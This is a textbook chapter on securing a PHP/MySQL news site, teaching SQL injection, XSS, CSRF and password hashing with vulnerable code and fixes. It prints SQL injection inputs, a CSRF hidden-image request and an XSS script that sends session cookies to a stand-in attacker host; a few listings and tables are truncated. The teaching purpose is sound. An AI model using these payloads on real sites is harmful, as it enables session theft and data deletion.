Chapter 9

Web Application Security

Before the connection to the database (Section 8.4), the Contraponto site only displayed information written in the code. With the database, it now receives text from strangers and stores it. This brings three responsibilities: protecting the data of readers and staff, preventing anyone from reading or changing what is not theirs, and keeping the service running with its data intact. Security is not a feature added at the end: it accompanies every line of code written.

9.1 The Reference: OWASP Top 10

The most widely used reference for classifying web application vulnerabilities is the OWASP Top 10, a list of the most critical security risks, published by the Open Worldwide Application Security Project and periodically updated based on the analysis of data on real vulnerabilities (OWASP Foundation 2026). The most recent edition is the 2025 one. This chapter covers nine security topics, which correspond to six categories of the list:

The other four categories of the list (A06, A08, A09 and A10) are not covered in this chapter.

9.2 Never Trust Client Data

In a web application, the client (the browser) requests and displays pages, the server (PHP) handles the request and builds the page, and the database (MySQL) stores and returns the data. An attacker acts on the first link: they change what the client sends. Therefore, everything that arrives from the client ($_GET, $_POST, $_COOKIE) may have been altered, and even a valid request may not have been intended. This is the principle that runs through the whole chapter, and it gives rise to three classic attacks:

  • SQL Injection (A05): the data reaches the database carrying a malicious command, which the database executes;
  • XSS (A05): the data returns to another user’s browser carrying malicious code, which that browser executes;
  • CSRF (A01): the browser sends a request that looks like it comes from the user, with the session cookie.

9.3 Vulnerabilities in Custom Code

The vulnerabilities in this section are in code written by the programmer, and each one has a defence that is applied in that same code.

9.3.1 SQL Injection

SQL Injection occurs when text typed by the user is pasted into an SQL statement, and MySQL can no longer tell command from value (Section 8.7). The data then carries a malicious command, which the database executes. Consider a delete.php that joins the id to the SQL statement, instead of using a ?:

<?php
$id = $_GET["id"];
$conexao->query("DELETE FROM artigos WHERE id = $id");

With the normal request, delete.php?id=3, the statement executed is DELETE FROM artigos WHERE id = 3, which deletes article 3. But the attacker can request delete.php?id=0 OR 1=1:

DELETE FROM artigos WHERE id = 0 OR 1=1

The expression 1=1 is always true: with OR, the condition becomes true for every row, regardless of the id, and the DELETE deletes all the articles. The query() method does not execute two statements in the same command, so it is not possible to add, for instance, a DROP or another DELETE, but changing a condition is enough to do damage.

The same mechanism allows entry into a restricted area without knowing the password. Consider a login form implemented insecurely, through direct concatenation:

<?php
require "config.php";
$utilizador = $_POST["utilizador"];
$password = $_POST["password"];
$sql = "SELECT * FROM utilizadores
        WHERE utilizador = '$utilizador'
        AND password = '$password'";
$resultado = $conexao->query($sql);
if ($linha = $resultado->fetch_assoc()) {
    echo "Sessão iniciada.";
}

If an attacker enters, in the utilizador field, the text ' OR '1'='1' -- (with a space at the end of the text; without it, MySQL reports a syntax error), the SQL statement actually executed becomes:

SELECT * FROM utilizadores
WHERE utilizador = '' OR '1'='1'
-- ' AND password = '...'

Since '1'='1' is always true, and -- turns the rest of the line into an SQL comment, the password is never checked. The query returns every row and PHP uses the first one, so the attacker logs in as the first user in the table, without knowing any valid password.

The defence is the one seen in Section 8.7: always use prepared statements. The command goes with a ? in place of the values, and the values travel separately. The attacker’s text stops being part of the command and becomes just a value to look for, which does not exist:

<?php
require "config.php";
$stmt = $conexao->prepare(
    "SELECT * FROM utilizadores
     WHERE utilizador = ? AND password = ?"
);
$stmt->bind_param("ss", $_POST["utilizador"], $_POST["password"]);
$stmt->execute();
$resultado = $stmt->get_result();
if ($linha = $resultado->fetch_assoc()) {
    echo "Sessão iniciada.";
} else {
    echo "Utilizador ou palavra-passe inválidos.";
}

Nobody is called ' OR '1'='1' --, so the login fails. One problem remains to be solved, however: the password is still compared in plain text (Section 9.3.4).

9.3.2 XSS (Cross-Site Scripting)

XSS (Cross-Site Scripting, in which the letter “X” stands for “Cross”) occurs when a text written by a user, with malicious code inserted in it, is shown to other users without being handled: the browser interprets that code and executes it. The attacker’s code thus runs inside another site, the one under attack. Consider the comments page of an article, which displays the submitted text directly:

<?php
echo "<p>" . $_POST["comentario"] . "</p>";

A normal comment, such as Muito bom!, appears as it was written. A comment with <b>Muito bom!</b> appears in bold, because the browser interprets the tag. And a comment with a <script> shows nothing, but the code runs. The code inserted in the text has become part of the page, and the browser cannot tell the site’s code from the code inserted by the visitor.

The attack unfolds in five steps. The attacker writes a malicious comment, for example:

<script>document.location='http://atacante.com/roubo?c='+document.cookie</script>

The Contraponto site stores and displays it. When an authenticated user, such as Rita, the site manager, opens the page, she receives it with the <script> inside, and the code runs in her browser. The script sends this site’s session cookie to the attacker, without Rita seeing anything, and the attacker uses that cookie to enter the site as Rita, with her privileges (Section 7.9.2). Note that the script can only read the cookies of the site itself: those of other sites, such as the bank, remain out of reach.

The defence is to always escape the text coming from users before displaying it in HTML, with the htmlspecialchars() function. This function replaces the special HTML characters (<, >, & and quotes) with harmless entities, and the browser displays the text instead of executing it:

<?php
echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";

This way, the attacker’s text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.

9.3.3 CSRF (Cross-Site Request Forgery)

CSRF (Cross-Site Request Forgery) is a request that is forged (forgery) from another site (cross-site). It occurs when an attacker tricks the browser of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the browser automatically sends session cookies on any request to that domain, as seen in Section 7.9.1. The attacked site receives a request that looks like it comes from Rita, but it was the attacker’s page that made it be sent.

Consider the delete.php of Section 8.9, in which, to delete a record, it is enough for the browser of Rita (authenticated on the Contraponto site) to request this address:

GET /delete.php?id=3

If the attacker’s page has, in its HTML, an “image” that is invisible to Rita (width="0", height="0"), in which the src, which should be the address of an image, contains the address of delete.php:

<img src="https://contraponto.example/delete.php?id=3" width="0" height="0">

then, when Rita visits that page, the browser sends the request when loading the “image” and attaches the session cookie by itself: it is a GET that deletes data. delete.php sees a valid session and deletes article 3, without Rita having clicked anything. The attacker never sees the cookie (unlike XSS, in which they steal it): they use Rita’s browser to send the request.

The defence has two complementary parts. The first is never to change data through GET, as already recommended in Section 7.4.3 (GET reads, POST changes). The second is to put, in every sensitive form, an unpredictable token, stored in the session and checked before acting. The form generates the token and sends it in a hidden field:

<?php
session_start();
if (empty($_SESSION["token"])) {
    $_SESSION["token"] = bin2hex(random_bytes(32));
}
?>
<form action="delete.php" method="post">
  <input type="hidden" name="id" value="3">
  <input type="hidden" name="token"
         value="<?= $_SESSION["token"] ?>">
  <button>Apagar</button>
</form>

The random_bytes(32) function generates unpredictable values, bin2hex() converts them to text and hash_equals() compares the two tokens. delete.php rejects the request if the token is missing or does not match:

<?php
session_start();
if (!isset($_SESSION["token"], $_POST["token"])
    || !hash_equals($_SESSION["token"],
                    $_POST["token"])) {
    http_response_code(403);
    exit("Pedido inválido.");
}
// valid token: delete with a prepared statement

The if reads piece by piece:

  1. !isset($_SESSION["token"], $_POST["token"]): the ! means “not”, so the condition is true if either of the two tokens is missing;
  2. || means “or”: it is enough for one of the conditions to be true to reject the request. If the first is true, the second is not even evaluated, which guarantees that hash_equals() never receives a missing value;
  3. !hash_equals(...): true if the two tokens are different;
  4. { ... }: replies with the 403 code and exit ends the script.

The attacker’s page does not know the token: the browser does not let it read the Contraponto page (the same-origin policy), so it cannot include the token in the request.

9.3.4 Plain-Text Passwords

If passwords are stored exactly as they were typed, this is what the attacker sees if they steal the utilizadores table:

An SQL Injection, a configuration error or a stolen backup expose the whole table. The attacker gets each person’s password, and people reuse passwords on other services. Even whoever administers the site can read the users’ passwords. This is how the login in Section 9.3.1 compares them, and this is why a password must never be stored: what is stored is a kind of fingerprint of it.

The hash

A hash is the result of a function that turns the password into a fixed-size value. It identifies the password but does not allow it to be reconstructed: the password cannot be recovered from the hash, it can only be guessed, by trial and error. The database stores only the hash, and the real password is never stored. At login, PHP checks whether what the person typed as a password matches the stored hash.

PHP has two functions for this. At registration, password_hash() creates the hash, and at login, password_verify() checks it:

<?php
$hash = password_hash(
    $_POST["password"], PASSWORD_DEFAULT
);
<?php
// $hash comes from the database
if (password_verify(
        $_POST["password"], $hash)) {
    // correct password
}

Two runs of password_hash() with the same password give different results, for example:

$2y$12$BpqtsRr5RdRVkRxTwYNZr.xd21tabzoCdzCgglor5pk9Ilryp9Xt2
$2y$12$JN664fXU3AqFVrjy2BYRruHKFpVmDZnHpk4rHlZTo5mSHGVvCrjnC

This is normal. PHP adds a random value, the salt, to the password before calculating, and the same text never gives the same hash: two people with the same password end up with different hashes. password_verify() reads the salt inside the stored hash and repeats the calculation.

Each hash takes up 60 characters and already includes the algorithm and the salt. The PASSWORD_DEFAULT constant picks the recommended algorithm (today, bcrypt) and may change, which is why the password column becomes VARCHAR(255). A weak password, such as 12345678, will still be discovered: the hash protects the table, not poor choices.

Registration and login

registo.php stores only the hash, and login.php searches only by user:

<?php
require "config.php";
$utilizador = $_POST["utilizador"];
$hash = password_hash($_POST["password"],
                      PASSWORD_DEFAULT);
$stmt = $conexao->prepare(
    "INSERT INTO utilizadores
     (utilizador, password) VALUES (?, ?)"
);
$stmt->bind_param("ss", $utilizador, $hash);
$stmt->execute();
<?php
require "config.php";
$stmt = $conexao->prepare(
    "SELECT password FROM utilizadores
     WHERE utilizador = ?"
);
$stmt->bind_param("s", $_POST["utilizador"]);
$stmt->execute();
$resultado = $stmt->get_result();
$linha = $resultado->fetch_assoc();
if ($linha && password_verify($_POST["password"],
                              $linha["password"])) {
    session_start();
    $_SESSION["utilizador"] = $_POST["utilizador"];
    header("Location: painel.php");
} else {
    echo "Utilizador ou palavra-passe inválidos.";
}

This login differs from the one in the SQL Injection section in four ways:

  1. Registration stores only the hash;
  2. The login searches only by user: the password never enters the SQL;
  3. If the user does not exist, the $linha && avoids checking the password;
  4. The error message does not say whether the user or the password failed, so as not to reveal to an attacker that a given username exists.

9.4 Vulnerabilities in Third-Party Dependencies

The attack surface of a website is not limited to the code written directly by its programmer. Much of today’s Web is built on content management systems, such as WordPress, extended through third-party plugins, often developed by very small teams or even a single independent programmer. According to Patchstack’s report State of WordPress Security in 2026, 91% of the new vulnerabilities in the WordPress ecosystem in 2025 were in plugins and 9% in themes; the WordPress core had only 6, out of more than 11,000 (11,334), all of them low priority (Patchstack 2026).

This reality led the most recent update of the OWASP Top 10 to keep a category dedicated to failures in the software supply chain (Software Supply Chain Failures, A03), recognising that an application’s security also depends on the security of every library, framework and extension it relies on, not just the code written by the team itself (OWASP Foundation 2026). A library may, moreover, depend on another vulnerable one (transitive dependencies): this is the case of Log4Shell (2021), a flaw in a logging library present in thousands of applications. The flaw may be in code that the site’s owner never wrote, but the risk it represents is just as real.

In the case of Contraponto, the site does not use third-party libraries, but it runs on third-party software, the web server and MySQL, which also have flaws.

9.5 Best Practices

A few simple practices significantly reduce the security risk of a web application.

9.5.1 Regular updates

Many flaws are only exploited after they become public, and the interval between disclosure and exploitation can be very short. PHP, the web server and MySQL should be kept up to date (old versions stop receiving fixes, and their flaws become public and documented), as should plugins and themes, installing only the necessary ones, from trustworthy sources, and removing those that are no longer used. Checking the version is the first step to knowing whether there are fixes to apply:

php -v           # PHP version
mysql --version  # MySQL version

Updating is not just running a command: it is advisable to test first and have a backup, because an update can also fail.

9.5.2 Principle of least privilege

Every component of an application, and every database user, should have only the permissions it needs, never full access for convenience. With the SQL permission-control commands (Section 8.2), a user is created just for the application:

-- creates the user that the application uses
CREATE USER 'contraponto_app'@'localhost'
    IDENTIFIED BY 'palavra-passe-forte';

-- only these operations, only on this database
GRANT SELECT, INSERT, UPDATE, DELETE
    ON contraponto.* TO 'contraponto_app'@'localhost';

This account cannot drop tables, change the structure (DROP, ALTER, CREATE) or access other databases. It can still read and change the Contraponto data, however: least privilege limits the damage, it does not prevent the attack. Using the root user in a web application is a serious bad practice: with an SQL Injection, the attacker would have full access to the database server. The same principle applies to files: the web server should only be able to write to the folders it needs (for example, the one for uploaded files), never to the PHP code.

9.5.3 Validate and escape data

All data coming from outside ($_GET, $_POST, $_COOKIE, HTTP headers) is treated as untrusted. Validation checks whether the data has the expected format, such as a non-empty text, a number or a date:

<?php
if (!isset($_POST["comentario"])
    || $_POST["comentario"] === "") {
    exit("Escreve um comentário.");
}

Validating does not replace escaping: a non-empty comment passes validation and may contain <script>. And validation done in the browser does not protect, because an attacker sends the request without going through the form.

9.5.4 Do not show errors in production

During development, display_errors helps find out what is failing (Section 8.8). On a production site, the same message helps the attacker: it reveals names of tables, files and users. The development configuration shows errors on screen; the production one logs them without showing them:

<?php
// development
error_reporting(E_ALL);
ini_set("display_errors", 1);
<?php
// production
error_reporting(E_ALL);
ini_set("display_errors", 0);
ini_set("log_errors", 1);

A visitor could read, for example, Access denied for user 'utilizador'@'localhost', which reveals the name of the database user, or You have an error in your SQL syntax, which confirms that their input reached the query (SQL Injection). In production, errors are still all logged, but they go to the server’s error log, which only the team reads. In practice, these options are set in php.ini, the PHP configuration on the server, and not on each page.

<?php

require "config.php";
$u = $_POST["utilizador"];
$p = $_POST["password"];
$r = $conexao->query("SELECT * FROM utilizadores

require "config.php";
$c = $_GET["apagar"];

The challenge has three steps:

  1. Say which attack each flaw allows;
  2. Rewrite the two files with the appropriate defence (Section 9.3.1, Section 9.3.2, Section 9.3.3 and Section 9.3.4);
  3. Add the registration page, with password_hash().

9.6.1 The corrected files

The six flaws and their fixes are marked by numbers in the comments of the corrected files:

<?php
// login.php
require "config.php";
$u = $_POST["utilizador"];
$p = $_POST["password"];
$stmt = $conexao->prepare(  // 1
    "SELECT password FROM utilizadores
     WHERE utilizador = ?");
$stmt->bind_param("s", $u);
$stmt->execute();
$linha = $stmt->get_result()->fetch_assoc();
if ($linha &&
    password_verify($p, $linha["password"])) {  // 2
    session_start();
    $_SESSION["utilizador"] = $u;
    echo "Sessão iniciada.";
}
<?php
// comentarios.php
require "config.php";
session_start();
if (!isset($_SESSION["utilizador"])) {  // 5
    exit("Acesso negado.");
}
if (isset($_SESSION["token"], $_POST["apagar"],  // 3
        $_POST["token"])
    && hash_equals($_SESSION["token"], $_POST["token"])) {
    $stmt = $conexao->prepare(  // 4
        "DELETE FROM comentarios WHERE id = ?");
    $stmt->bind_param("i", $_POST["apagar"]);
    $stmt->execute();
}
$r = $conexao->query("SELECT texto FROM comentarios");
while ($linha = $r->fetch_assoc()) {
    echo "<p>" .
         htmlspecialchars($linha["texto"]) . "</p>";  // 6
}
  1. SQL Injection in the login: prepared statements;
  2. plain-text password: password_verify() on the hash (registration is in Section 9.3.4.2);
  3. CSRF: delete through POST, with a token, instead of GET (the form with the token is the one in Section 9.3.3);
  4. SQL Injection in the DELETE: prepared statement;
  5. missing session check: only someone who has logged in can delete;
  6. XSS: htmlspecialchars() when displaying the comments.
